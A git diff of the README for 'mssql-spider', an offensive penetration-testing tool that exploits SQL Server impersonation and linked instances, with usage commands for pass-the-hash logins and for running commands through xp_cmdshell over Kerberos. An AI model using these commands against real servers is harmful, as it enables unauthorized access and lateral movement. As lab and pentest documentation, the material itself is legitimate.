@@ -2,11 +2,10 @@
 
 ![Screenshot](./assets/demo.png)
 
-An improved [impacket-mssqclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) that exploits user impersonation and follows linked instances to discover and compromise as many Microsoft SQL Servers as it can reach.
+An improved [impacket-mssqclient](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) that exploits impersonation and linked instances to discover and compromise as many Microsoft SQL Servers as it can reach.
+For example, it can solve the OSEP Lab Challenge 2 automatically.
 
 Big thanks to the developers of fortra/impacket#1397, [SQLRecon](https://github.com/skahwah/SQLRecon) and [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) on which this project is based.
-
-> **Warning:** Although this project was successfully tested in the lab and solves the OSEP Challenge 2 automatically, it is still kinda work in progress.
 
 # Setup
 
@@ -46,6 +45,7 @@ mssql-spider -d corp.local -u jdoe -H :b9f917853e3dbf6e6831ecce60725930 --coerce
 Authenticate via Kerberos and execute a command trough `xp_cmdshell` on all hosts where you can obtain sysadmin privileges.
 
 ~~~ bash
+export KRB5CCNAME=./dbsvc.ccache
 mssql-spider -k -n -x 'whoami /groups' db01.corp.local:50123 db02.corp.com:1433
 ~~~
 
